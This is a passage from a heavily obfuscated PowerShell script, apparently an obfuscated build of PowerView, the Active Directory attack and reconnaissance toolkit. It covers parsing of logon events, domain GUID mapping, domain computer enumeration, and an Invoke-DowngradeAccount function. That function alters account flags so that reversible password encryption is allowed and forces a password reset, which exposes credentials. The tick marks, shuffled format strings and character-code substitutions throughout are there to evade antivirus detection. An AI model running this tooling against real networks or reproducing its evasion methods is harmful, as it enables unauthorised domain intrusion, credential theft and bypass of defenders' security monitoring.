 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('@S'+'y'+'ste'+'mTim'+'e&gt'+';'+'={0}{1}({1}S'+'tar'+'tTime.ToUnive'+'rs'+'alTim'+'e()'+'.ToSt'+'r'+'i'+'ng({0}s'+'{0}'+')){0'+'} ')-F [CHaR]39,[CHaR]36+'and'+' '+(('@SystemTim'+'e&lt;='+'lGdv'+'Vc(vVc'+'EndTime.ToUniversalTim'+'e'+'('+')'+'.'+'ToString(lGd'+'s'+'lGd'+'))lGd
 ')-cRePlacE([CHAR]118+[CHAR]86+[CHAR]99),[CHAR]36-cRePlacE'lGd',[CHAR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a'+'nd
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('*[E'+'vent'+'D'+'ata[Data[@Name='+'I4'+'TT'+'a'+'rget'+'UserName'+'I4T'+']'+' ')."Repla`cE"(([char]73+[char]52+[char]84),[sTRiNG][char]39)+'!='+' '+(('v'+'cE'+'ANONYMO'+'U'+'S ')-CrEplaCE 'vcE',[CHAR]39)+(('LOGONt'+'U'+'1]]
 ')-CrePlACe  'tU1',[ChAr]39)+' '+' '+' '+' '+' '+' '+' '+'</S'+'elec'+'t>

 '+' '+' '+' '+' '+' '+' '+' '+'<!-'+'- '+'Logon'+' '+'wi'+'th '+'exp'+'lic'+'it '+'credenti'+'a'+'l'+' '+'events'+' '+'-'+'->
 '+' '+' '+' '+' '+' '+' '+' '+'<Se'+'lect'+' '+(('P'+'at'+'h=hOu'+'Secu'+'ri'+'tyhOu>
 ')  -crEpLace  ([chAR]104+[chAR]79+[chAR]117),[chAR]34)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'*[
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'S'+'ystem[
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'Pr'+'ovi'+'der[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('@'+'Nam'+'e'+'=Z'+'4'+'1Microso'+'ft-Windows'+'-Sec'+'uri'+'ty-Aud'+'itingZ4'+'1'+'
'+' ')."rE`pLacE"(([chAR]90+[chAR]52+[chAR]49),[STrING][chAR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a'+'nd '+'(L'+'evel='+'4 '+'or'+' '+'Le'+'ve'+'l'+'=0) '+'a'+'nd '+'(E'+'ventID=4648)'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'an'+'d '+'Ti'+'meCre'+'ated[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('@S'+'yste'+'mTime&gt;={0'+'}{1}({1}S'+'tartTime'+'.'+'To'+'U'+'niver'+'salTime('+').T'+'oStri'+'ng({0}s{'+'0}'+')){0} ') -f[chAr]39,[chAr]36+'a'+'nd '+(('@S'+'y'+'stemTime&lt;'+'=so'+'z6'+'md'+'(6mdEndT'+'ime'+'.'+'ToUni'+'versa'+'lTi'+'me().ToStri'+'ng'+'(sozssoz)'+')so'+'z'+'
 ')-REPlacE'6md',[ChAR]36-REPlacE  ([ChAR]115+[ChAR]111+[ChAR]122),[ChAR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+'<'+'/'+'Select>

 '+' '+' '+' '+' '+' '+' '+' '+'<Suppr'+'e'+'ss '+(('Path'+'=Hb'+'QSecurity'+'HbQ>
 ') -cREpLACe([CHAR]72+[CHAR]98+[CHAR]81),[CHAR]34)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'*'+'[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'Sys'+'t'+'e'+'m[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'Provid'+'er'+'[
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('@Na'+'me=W46Mic'+'rosoft-Windo'+'w'+'s-Secu'+'r'+'ity-AuditingW4'+'6
 ')."Re`pL`ACe"('W46',[STrIng][cHaR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'and'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'('+'L'+'evel'+'=4 '+'o'+'r '+'Le'+'vel='+'0) '+'an'+'d '+'('+'EventID'+'=46'+'24 '+'o'+'r '+'EventI'+'D=462'+'5'+' '+'or'+' '+'E'+'ventID'+'=4634)'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'and
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'*'+'[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'EventDa'+'ta'+'[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'('+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('(Data['+'@N'+'ame=bgfL'+'ogon'+'Typ'+'ebg'+'f]=b'+'gf5bgf ')."RE`plaCe"(([cHAR]98+[cHAR]103+[cHAR]102),[STrIng][cHAR]39)+'o'+'r '+('Dat'+'a[@Name'+'=C'+'m7LogonT'+'ype'+'Cm7'+']'+'=Cm70'+'Cm7'+')
 ')."R`EPLa`ce"(([Char]67+[Char]109+[Char]55),[StrING][Char]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'or'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+(('D'+'ata[@Name='+'F5'+'JTargetUser'+'N'+'ameF'+'5J'+']'+'=F'+'5J'+'ANO'+'NYM'+'OUS ') -rePlacE ([cHaR]70+[cHaR]53+[cHaR]74),[cHaR]39)+('LOG'+'O'+'N{0}
 ') -F[chAr]39+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'o'+'r
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+(('Data[@Name'+'='+'I4CTargetUse'+'rSIDI4'+'C]=I'+'4CS'+'-'+'1-5-18I4C
 ')-RePLACe  ([CHar]73+[CHar]52+[CHar]67),[CHar]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+')'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+'</Supp'+'re'+'ss>
 '+' '+' '+' '+('<'+'/Qu'+'ery>
</QueryList'+'>
ri0')."RePla`Ce"(([ChAR]114+[ChAR]105+[ChAR]48),[STRInG][ChAR]34))
        ${eVEnTaR`g`U`meN`Ts} = @{
            ("{0}{1}{3}{2}" -f 'Fi','lterX','th','Pa') = ${x`pA`THf`iLteR}
            ("{1}{0}" -f'ame','LogN') = ("{0}{2}{1}"-f 'Secur','y','it')
            ("{0}{2}{3}{1}" -f 'M','ts','axEve','n') = ${ma`XEv`EN`Ts}
        }
        if (${ps`BO`UNdpA`R`AmEt`ers}[("{0}{1}{2}{3}" -f 'Cre','den','t','ial')]) { ${evE`NTaRGume`N`TS}[("{2}{3}{0}{1}"-f'n','tial','Cr','ede')] = ${c`REDE`NTi`Al} }
    }

    PROCESS {
        ForEach (${CO`M`pUTer} in ${c`omputERn`AME}) {

            ${e`V`EnTargUmE`NTs}[("{2}{3}{0}{1}" -f 'rNa','me','C','ompute')] = ${co`MPU`TeR}

            &("{3}{2}{0}{1}"-f 'inEv','ent','et-W','G') @EventArguments| &("{3}{2}{1}{0}"-f 'ct','h-Obje','ac','ForE') {
                ${Ev`E`Nt} = ${_}
                ${pro`P`erTiES} = ${Ev`ENt}."p`RoPER`TIES"
                Switch (${e`Vent}."iD") {
                    
                    4624 {
                        
                        if(-not ${pR`op`ErTiES}[5]."v`AlUe".("{0}{2}{1}" -f 'End','ith','sW').Invoke('$')) {
                            ${OuTP`UT} = &("{1}{0}{2}" -f'w-','Ne','Object') ("{2}{0}{1}" -f'jec','t','PSOb') -Property @{
                                ("{1}{0}{2}"-f'te','Compu','rName')              = ${Com`P`Ut`er}
                                ("{1}{0}{2}" -f 'meCrea','Ti','ted')               = ${eVe`Nt}."t`I`MEcREATeD"
                                ("{1}{0}"-f'tId','Even')                   = ${E`V`eNt}."i`d"
                                ("{1}{0}{2}{3}"-f 'ub','S','jectUser','Sid')            = ${pR`OPERt`I`es}[0]."VaL`UE".("{1}{2}{0}" -f'ng','ToS','tri').Invoke()
                                ("{1}{3}{4}{0}{2}"-f'User','Subje','Name','c','t')           = ${Proper`TI`Es}[1]."Va`lUE"
                                ("{3}{2}{0}{1}"-f 'am','e','inN','SubjectDoma')         = ${P`ROpE`RT`IES}[2]."val`Ue"
                                ("{2}{0}{4}{3}{1}"-f'bje','onId','Su','g','ctLo')            = ${PRo`pErti`ES}[3]."vA`LuE"
                                ("{3}{1}{0}{2}"-f 'etUs','arg','erSid','T')             = ${P`RoPe`RT`Ies}[4]."V`ALUE".("{1}{0}" -f 'tring','ToS').Invoke()
                                ("{0}{3}{2}{1}"-f'Tar','ame','erN','getUs')            = ${P`R`OPErtieS}[5]."V`ALUe"
                                ("{0}{1}{2}{3}" -f 'T','a','rg','etDomainName')          = ${p`RoPE`R`TieS}[6]."VAl`UE"
                                ("{1}{2}{0}"-f 'Id','Targ','etLogon')             = ${proPe`R`T`ieS}[7]."VAL`Ue"
                                ("{2}{0}{1}" -f'o','gonType','L')                 = ${PR`OPeR`TIEs}[8]."v`AlUe"
                                ("{1}{0}{3}{2}"-f 'gonP','Lo','ssName','roce')          = ${PR`oPEr`T`iES}[9]."va`LUE"
                                ("{0}{2}{1}{4}{3}{5}"-f 'Auth','ticat','en','ckageNam','ionPa','e') = ${ProPEr`TI`ES}[10]."vA`lue"
                                ("{4}{3}{0}{1}{2}" -f 'at','ion','Name','t','Works')           = ${pr`opEr`T`ieS}[11]."VA`LUe"
                                ("{2}{1}{0}"-f'id','gonGu','Lo')                 = ${p`ROp`er`TIes}[12]."V`ALUe"
                                ("{3}{2}{1}{0}" -f 's','tedService','mit','Trans')       = ${pRo`PeRTi`es}[13]."VAL`UE"
                                ("{0}{1}{2}" -f'L','mPa','ckageName')             = ${p`ROPe`RtiES}[14]."V`ALuE"
                                ("{2}{0}{1}"-f 'eyLengt','h','K')                 = ${pRopeRt`i`es}[15]."v`Alue"
                                ("{1}{0}{2}{3}"-f'ro','P','ce','ssId')                 = ${PRoPERT`I`es}[16]."VAl`UE"
                                ("{1}{0}{2}" -f 'cessN','Pro','ame')               = ${Pr`operti`ES}[17]."VA`LUE"
                                ("{2}{1}{0}" -f'ress','pAdd','I')                 = ${p`R`Ope`RtiES}[18]."va`lUe"
                                ("{1}{0}{2}"-f'Po','Ip','rt')                    = ${PR`oPer`TIes}[19]."vAL`Ue"
                                ("{1}{0}{2}{4}{3}"-f'na','Imperso','tion','el','Lev')        = ${Pr`opeRTi`Es}[20]."VA`LuE"
                                ("{1}{3}{4}{2}{0}"-f'nMode','R','mi','estrict','edAd')       = ${P`Rope`RTIeS}[21]."vA`luE"
                                ("{3}{2}{4}{1}{0}"-f'rName','dUse','tbou','TargetOu','n')    = ${PR`O`PErTIeS}[22]."V`ALUe"
                                ("{2}{1}{3}{4}{0}{5}"-f'o','getO','Tar','utbou','ndD','mainName')  = ${p`ROpErt`i`ES}[23]."Val`Ue"
                                ("{1}{2}{3}{0}"-f 'unt','Virt','ual','Acco')            = ${PROpE`Rt`i`eS}[24]."vA`lUE"
                                ("{2}{0}{1}{3}" -f'argetLinked','Lo','T','gonId')       = ${p`ROPE`R`Ties}[25]."va`lUe"
                                ("{2}{1}{4}{0}{3}" -f'o','evated','El','ken','T')             = ${P`RoP`er`TiEs}[26]."V`AluE"
                            }
                            ${Ou`TpUT}."P`soBJe`CT"."TyPE`NamES".("{0}{1}"-f'Inse','rt').Invoke(0, ("{2}{1}{3}{4}{0}"-f'ogonEvent','w','PowerVie','.','L'))
                            ${oU`T`Put}
                        }
                    }

                    
                    4648 {
                        
                        if((-not ${pROP`eR`T`ies}[5]."VaL`Ue".("{0}{1}" -f'EndsWi','th').Invoke('$')) -and (${PROp`E`RTIES}[11]."v`AlUE" -match ((("{2}{4}{3}{1}{0}"-f'e','l.ex','task','Dc','host'))."REplA`ce"(([chaR]68+[chaR]99+[chaR]108),'\')))) {
                            ${ou`T`put} = &("{1}{0}{2}" -f'w','Ne','-Object') ("{2}{1}{0}"-f 'bject','O','PS') -Property @{
                                ("{1}{0}{3}{2}"-f'uter','Comp','ame','N')              = ${CO`mPu`TeR}
                                ("{0}{3}{1}{2}" -f 'TimeCre','e','d','at')       = ${ev`e`NT}."T`im`eCReATeD"
                                ("{2}{0}{1}" -f'ven','tId','E')           = ${ev`E`NT}."Id"
                                ("{2}{4}{3}{1}{0}"-f 'rSid','e','Subje','s','ctU')    = ${prOPE`R`TIeS}[0]."VAl`Ue".("{2}{1}{0}"-f'String','o','T').Invoke()
                                ("{1}{2}{0}" -f 'Name','Su','bjectUser')   = ${PR`Ope`RtIEs}[1]."v`Alue"
                                ("{3}{0}{1}{2}{4}{5}"-f 'a','i','n','SubjectDom','Na','me') = ${P`RopERT`iEs}[2]."VA`luE"
                                ("{1}{0}{2}" -f'ctLo','Subje','gonId')    = ${PR`oPeRti`eS}[3]."Va`LUe"
                                ("{1}{0}{2}"-f'o','Log','nGuid')         = ${PR`opE`Rt`ieS}[4]."Val`Ue".("{2}{0}{1}"-f'i','ng','ToStr').Invoke()
                                ("{0}{2}{3}{4}{1}"-f'Targe','me','tUs','er','Na')    = ${pRoP`Erti`es}[5]."VAl`UE"
                                ("{3}{2}{0}{4}{1}"-f'a','e','rgetDom','Ta','inNam')  = ${pRO`pE`RTiEs}[6]."v`ALUe"
                                ("{2}{3}{1}{0}" -f'id','etLogonGu','T','arg')   = ${p`ROP`ERt`Ies}[7]."VAL`UE"
                                ("{0}{3}{1}{2}"-f 'Tar','verNa','me','getSer')  = ${pRo`Per`TIeS}[8]."va`lUe"
                                ("{2}{1}{0}" -f'tInfo','e','Targ')        = ${PR`opERTI`eS}[9]."v`AluE"
                                ("{1}{2}{0}"-f 'Id','Pr','ocess')         = ${pRo`pE`Rt`ies}[10]."V`ALUe"
                                ("{2}{0}{1}" -f'e','ssName','Proc')       = ${p`Rope`R`Ties}[11]."V`ALUe"
                                ("{1}{0}{2}"-f'dres','IpAd','s')         = ${PRo`PErT`IEs}[12]."VA`lUE"
                                ("{0}{1}" -f'IpPo','rt')            = ${pR`op`ERtI`Es}[13]."Val`Ue"
                            }
                            ${oU`TPUT}."PS`OBJECT"."T`YpeN`AMeS".("{1}{0}" -f't','Inser').Invoke(0, ("{9}{6}{8}{5}{0}{3}{4}{1}{7}{2}" -f 'ed','nE','t','entia','lLogo','ExplicitCr','o','ven','werView.','P'))
                            ${OU`TpuT}
                        }
                    }
                    ("{0}{1}{2}" -f 'd','e','fault') {
                        &("{0}{2}{1}{3}"-f'Writ','in','e-Warn','g') "No handler exists for event ID: $($Event.Id) "
                    }
                }
            }
        }
    }
}


function InvokE-DOW`NG`RADe`AcC`OUnT {


    [CmdletBinding()]
    Param (
        [Parameter(poSiTion=0,vAlUefROMpIpELINe=${tr`Ue})]
        [String]
        ${sAma`CcOUN`TNa`mE},

        [String]
        ${n`AME},

        [String]
        ${d`o`mAIn},

        [String]
        ${domaInCO`N`TrO`l`lEr},

        [String]
        ${F`ilt`er},

        [Switch]
        ${r`ePA`iR}
    )

    process {
        ${a`RgUMe`Nts} = @{
            ("{1}{3}{2}{0}"-f'e','SamAcc','m','ountNa') = ${SamA`Ccou`NtN`Ame}
            ("{1}{0}"-f 'me','Na') = ${NA`me}
            ("{0}{1}" -f 'Doma','in') = ${Do`m`AIn}
            ("{2}{1}{3}{0}" -f'oller','C','Domain','ontr') = ${doM`A`iN`COnTrO`llEr}
            ("{1}{0}{2}" -f 'te','Fil','r') = ${F`I`LTER}
        }

        
        ${U`ACVaLU`Es} = &("{1}{2}{0}"-f 't','Get-AD','Objec') @Arguments | &("{1}{0}"-f 'elect','s') ("{2}{1}{4}{3}{0}" -f 'l','sera','u','ntro','ccountco') | &("{2}{3}{1}{5}{4}{0}" -f'alue','-','ConvertFr','om','V','UAC')

        if(${rE`pAIr}) {

            if(${u`AC`VALUEs}."k`eYs" -contains ("{1}{3}{0}{4}{2}"-f'PWD_A','ENCRYPTED_TEXT','ED','_','LLOW')) {
                
                &("{0}{2}{3}{1}"-f 'S','ect','et-','ADObj') @Arguments -PropertyName ("{0}{2}{1}{3}" -f 'userac','nt','cou','control') -PropertyXorValue 128
            }

            
            &("{2}{1}{0}"-f 'ct','DObje','Set-A') @Arguments -PropertyName ("{0}{1}{2}" -f 'p','wd','lastset') -PropertyValue ('-1')
        }

        else {

            if(${UACV`A`luEs}."K`eyS" -contains ("{0}{2}{3}{4}{5}{1}" -f 'DONT_','RD','E','XPIRE_PA','SS','WO')) {
                
                &("{2}{3}{1}{0}"-f 'bject','t-ADO','S','e') @Arguments -PropertyName ("{2}{4}{0}{3}{1}"-f'ountc','ol','use','ontr','racc') -PropertyXorValue 65536
            }

            if(${UaC`VA`L`UES}."Ke`yS" -notcontains ("{5}{2}{8}{1}{4}{0}{6}{7}{3}"-f'T_PW','TED','N','OWED','_TEX','E','D_AL','L','CRYP')) {
                
                &("{0}{2}{3}{1}" -f 'Set-AD','ct','Ob','je') @Arguments -PropertyName ("{2}{1}{0}{3}"-f'contro','count','userac','l') -PropertyXorValue 128
            }

            
            &("{0}{1}{3}{2}" -f 'S','et','ject','-ADOb') @Arguments -PropertyName ("{2}{1}{0}" -f'dlastset','w','p') -PropertyValue 0
        }
    }
}


function gET`-d`OmaiNG`U`idMAp {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{4}{3}{2}{1}"-f'PSSho','ss','dProce','l','u'}, '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        ${DoM`AIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{3}{0}" -f 'oller','D','om','ainContr'})]
        [String]
        ${SE`R`VeR},

        [ValidateRange(1, 10000)]
        [Int]
        ${REsULt`PaG`eSI`ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SER`VE`RTiME`l`imiT},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${creD`e`NTi`Al} =  (GEt-VarIAbLe  ("0d"+"SQr")).vaLue::"E`mPTY"
    )

    ${GuI`ds} = @{("{7}{1}{3}{0}{4}{5}{2}{6}" -f '00-00','000','000-000000','0000-00','0','0-0','000000','0') = 'All'}

    ${foRESTar`G`U`menTS} = @{}
    if (${PSBO`UNDp`A`RAMe`T`Ers}[("{0}{1}{2}" -f'Crede','nt','ial')]) { ${foREst`A`Rg`UmEn`Ts}[("{3}{2}{1}{0}" -f'al','edenti','r','C')] = ${c`R`edenTI`AL} }

    try {
        ${s`c`hEmaPA`TH} = (&("{2}{1}{0}"-f 't','Fores','Get-') @ForestArguments)."SCH`EMA"."na`mE"
    }
    catch {
        throw ("{3}{8}{6}{10}{13}{2}{0}{9}{12}{4}{11}{7}{5}{1}" -f'st ','est','ng fore','[Get-DomainGUIDMap','h ',' Get-For','n','m','] Error i','sc',' re','fro','hema pat','trievi')
    }
    if (-not ${SchEM`AP`Ath}) {
        throw ("{3}{6}{14}{16}{0}{7}{4}{2}{18}{20}{12}{15}{10}{5}{1}{21}{19}{11}{9}{8}{17}{13}" -f'nGUID','for','E','[Get-','ap] ','ing ','D','M','m Get-For','ro','etriev',' path f','in ','st','o','r','mai','e','rr','ema','or ','est sch')
    }

    ${seA`R`ChErA`RGu`meNts} = @{
        ("{0}{1}{2}" -f 'Sear','chBa','se') = ${SC`HeM`APAth}
        ("{2}{0}{1}" -f 'PF','ilter','LDA') = ("{2}{0}{1}{3}{4}"-f 'emaIDG','UI','(sch','D=','*)')
    }
    if (${Psbo`UnDpAraMe`T`ERS}[("{0}{2}{1}" -f'D','ain','om')]) { ${Se`ARChe`Ra`RGumE`NTS}[("{1}{0}{2}"-f 'i','Doma','n')] = ${D`OMA`IN} }
    if (${P`sBOUNdPa`R`AM`eTe`Rs}[("{1}{0}" -f 'r','Serve')]) { ${sEaRChera`RgU`m`eN`TS}[("{0}{2}{1}" -f'Serv','r','e')] = ${ser`Ver} }
    if (${pS`B`OuNdpArAmete`RS}[("{1}{0}{2}"-f'g','ResultPa','eSize')]) { ${SeA`Rc`HeR`ARGUmEN`TS}[("{0}{1}{3}{2}{4}"-f'R','esul','PageSi','t','ze')] = ${re`sUl`TpA`geSizE} }
    if (${psb`oUNDpaR`Am`Ete`Rs}[("{1}{3}{4}{0}{2}"-f 'i','Se','mit','rverTime','L')]) { ${seAr`cHEr`A`R`GUmEN`TS}[("{3}{2}{0}{1}{4}"-f'TimeLi','m','ver','Ser','it')] = ${SERvE`Rti`M`E`lImIT} }
    if (${P`sBOuNDPa`RA`METE`Rs}[("{1}{2}{0}"-f'ial','Cr','edent')]) { ${s`earcheR`AR`g`UME`NTS}[("{1}{0}{2}" -f 'e','Cr','dential')] = ${CrEdE`Nt`IAL} }
    ${sch`Em`A`seaR`chER} = &("{2}{3}{1}{0}{4}" -f'omainSear','D','G','et-','cher') @SearcherArguments

    if (${sC`h`EMAsEa`RCher}) {
        try {
            ${RE`sUL`Ts} = ${s`cH`eMa`S`EARchEr}.("{1}{0}"-f 'll','FindA').Invoke()
            ${RE`su`LTS} | &("{0}{3}{1}{2}"-f'Where-','je','ct','Ob') {${_}} | &("{1}{2}{0}" -f 'ach-Object','F','orE') {
                ${gUi`dS}[(&("{2}{1}{0}" -f '-Object','w','Ne') ("{1}{0}"-f'uid','G') (,${_}."ProP`E`RtIeS"."sC`Hem`Ai`dGuiD"[0]))."g`UiD"] = ${_}."P`RO`Per`TIes"."N`Ame"[0]
            }
            if (${r`es`Ults}) {
                try { ${REs`Ul`Ts}.("{1}{0}"-f'ispose','d').Invoke() }
                catch {
                    &("{3}{1}{2}{0}"-f 'e','Ver','bos','Write-') ('[Ge'+'t'+'-Domai'+'nGUID'+'Map] '+'Err'+'or '+'di'+'sp'+'osing '+'o'+'f '+'the'+' '+'Re'+'sul'+'ts '+'ob'+'je'+'ct: '+"$_")
                }
            }
            ${S`CHEmASe`ARC`heR}.("{0}{2}{1}"-f 'd','ose','isp').Invoke()
        }
        catch {
            &("{2}{1}{0}"-f'e','e-Verbos','Writ') ('['+'Get-Dom'+'ainGUI'+'D'+'Map] '+'E'+'rror '+'i'+'n '+'build'+'ing'+' '+'GUI'+'D '+'map'+': '+"$_")
        }
    }

    ${sEArcHerARg`Um`EN`TS}[("{1}{2}{0}"-f 'e','Sea','rchBas')] = ${ScHEM`AP`Ath}.("{2}{0}{1}"-f'p','lace','re').Invoke(("{1}{0}"-f 'ma','Sche'),("{1}{0}{2}" -f'ed-','Extend','Rights'))
    ${sE`ArcHeRarGU`m`E`NTs}[("{0}{2}{1}"-f'LDAP','er','Filt')] = (("{8}{6}{1}{7}{5}{2}{3}{4}{0}"-f 'ght)','ec','ss=cont','rolAcces','sRi','Cla','bj','t','(o'))
    ${RIG`hTssEAr`c`hER} = &("{1}{3}{2}{4}{0}" -f'r','G','-D','et','omainSearche') @SearcherArguments

    if (${Rig`HTS`SEArCHeR}) {
        try {
            ${r`E`sULtS} = ${R`IGhTsSe`A`Rc`heR}.("{1}{0}" -f 'll','FindA').Invoke()
            ${rEs`ULtS} | &("{3}{2}{0}{1}" -f 'b','ject','e-O','Wher') {${_}} | &("{2}{1}{0}"-f'ct','rEach-Obje','Fo') {
                ${G`UIds}[${_}."pR`op`erti`es"."Rig`h`TSGuId"[0].("{2}{1}{0}" -f 'ring','St','to').Invoke()] = ${_}."PrO`pERt`ies"."nA`Me"[0]
            }
            if (${RESU`l`Ts}) {
                try { ${res`U`Lts}.("{0}{2}{1}"-f'di','ose','sp').Invoke() }
                catch {
                    &("{4}{0}{2}{1}{3}"-f'-','r','Ve','bose','Write') ('[G'+'e'+'t-'+'DomainG'+'U'+'IDMap] '+'Er'+'ror'+' '+'dispos'+'ing'+' '+'o'+'f '+'t'+'he '+'R'+'esult'+'s '+'objec'+'t:'+' '+"$_")
                }
            }
            ${R`IghT`SsEARcHER}.("{0}{2}{1}"-f 'di','ose','sp').Invoke()
        }
        catch {
            &("{0}{2}{1}"-f'Write','se','-Verbo') ('[Get'+'-D'+'omainG'+'UID'+'Map] '+'Er'+'ror'+' '+'in'+' '+'b'+'uilding'+' '+'GUID'+' '+'ma'+'p: '+"$_")
        }
    }

    ${gUi`dS}
}


function GEt-`DOM`AINco`mPU`TeR {


    [OutputType({"{0}{3}{4}{1}{2}"-f'PowerVi','ompu','ter','ew.','C'})]
    [OutputType({"{1}{0}{2}{4}{3}"-f 'Vie','Power','w.Co','puter.Raw','m'})]
    [CmdletBinding()]
    Param (
        [Parameter(POsiTIoN = 0, vaLuEfrompiPelINE = ${T`Rue}, VALUeFrOMpIpeLineBypROpErtyNAme = ${tr`Ue})]
        [Alias({"{2}{0}{3}{1}" -f 'm','Name','Sa','Account'}, {"{0}{1}"-f'N','ame'}, {"{1}{2}{0}"-f'Name','DNS','Host'})]
        [String[]]
        ${iDeN`T`ITy},

        [Switch]
        ${uNco`NSt`R`AI`NEd},

        [Switch]
        ${tRU`SteDto`A`UTH},

        [Switch]
        ${priNTE`RS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{3}{5}{0}{2}{4}"-f'in','Se','cipalN','rvi','ame','cePr'})]
        [String]
        ${S`pN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${O`pERA`TinGsYS`TEM},

        [ValidateNotNullOrEmpty()]
        [String]
        ${SerV`Ic`epacK},

        [ValidateNotNullOrEmpty()]
        [String]
        ${sIt`EN`AME},

        [Switch]
        ${Pi`Ng},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DO`MAIn},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}" -f'F','r','ilte'})]
        [String]
        ${l`dap`F`IlTer},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${Pr`OperT`ieS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f'AD','SPath'})]
        [String]
        ${s`EARchb`A`se},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{2}{4}{1}{0}" -f 'er','ll','Contr','Domain','o'})]
        [String]
        ${s`eRveR},

        [ValidateSet({"{0}{1}" -f 'B','ase'}, {"{0}{1}"-f'One','Level'}, {"{2}{1}{0}"-f 'ree','t','Sub'})]
        [String]
        ${sear`ch`sCOPe} = ("{1}{2}{0}" -f 'e','S','ubtre'),

        [ValidateRange(1, 10000)]
        [Int]
        ${REs`ULtpaG`eSI`ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sE`RVe`RTiM`ELImIT},

        [ValidateSet({"{0}{1}"-f'Da','cl'}, {"{1}{0}" -f'oup','Gr'}, {"{1}{0}"-f 'ne','No'}, {"{0}{1}" -f'Ow','ner'}, {"{0}{1}" -f 'S','acl'})]
        [String]
        ${SeCu`R`I`T`YMasKs},

        [Switch]
        ${tOm`BSTO`Ne},

        [Alias({"{1}{0}{2}" -f'turnO','Re','ne'})]
        [Switch]
        ${Fi`ND`oNe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`ede`NtIal} =   (  gcI  ('v'+'aR'+'iAb'+'lE:0dSq'+'R')  ).vALue::"e`mpTy",

        [Switch]
